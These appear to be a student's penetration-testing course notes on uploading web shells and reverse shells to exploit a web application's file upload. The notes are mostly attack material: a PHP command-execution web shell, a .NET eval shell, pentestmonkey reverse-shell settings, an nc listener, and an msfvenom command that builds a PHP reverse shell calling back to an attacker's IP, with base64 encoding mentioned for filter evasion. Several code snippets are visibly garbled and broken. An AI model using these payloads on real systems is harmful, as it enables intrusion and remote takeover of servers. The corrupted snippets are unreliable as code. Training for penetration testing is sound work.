
The final step in exploiting this web application is to upload the malicious script in the same language as the web application, like a web shell or a reverse shell script


## Web Shells

One good option for `PHP` is [phpbash](https://github.com/Arrexel/phpbash), which provides a terminal-like, semi-interactive web shell

```bash
/usr/share/seclists/Web-Shells
```

```
http://SERVER_IP:PORT/uploads/phpbash.php
```


## Writing Custom Web Shell
write a simple web shell manually.

we may not have access to online tools during some penetration tests

`PHP` web applications:
`system()` function
```php
<?pstem($_REQUEST['cmd']); ?>
```
```bash
http://SERVER_IP:PORT/uploads/shell.php?cmd=id
```

>It could be the only available option during some web penetration tests

>use source-view shows the command output as it would be shown in the terminal.


`.NET` web applications,:
```bash
<% eval reeeeequest('cmmmmmd') %>
```


>It must be noted that `in certain cases, web shells may not work`. This may be due to the web server preventing the use of some functions utilized by the web shell (e.g. `system()`), or due to a Web Application Firewall



## Reverse Shell

 reliable reverse shell for `PHP` is the [pentestmonkey](https://github.com/pentestmonkey/php-reverse-shell) PHP reverse shell
```php
$ip = 'OUR_IP';     // CHANGE THIS
$port = OUR_PORT;   // CHANGE THIS
```

```bash
nc -lvnp OUR_PORT
```


## Generating Custom Reverse Shell Scripts

`system` function and pass it a reverse shell command ==  unreliable

### **msfvenom**
```bash
AhmaDb0x@htb[/htb]$ msfvenom -p php/reverse_php LHOST=OUR_IP LPORT=OUR_PORT -f raw > reverse.php
```
`-p` flag and specify the output language with the `-f` flag
- `-f php` → Adds PHP tags (`<?php ... ?>`) around the payload.
- `-f base64` → Encodes the payload in **Base64** for bypassing filters.


>they may not always work, and we may have to rely on web shells instead. This can be for several reasons, like having a firewall on the back-end network that prevents outgoing connections or if the web server disables the necessary functions to initiate a connection back to us.

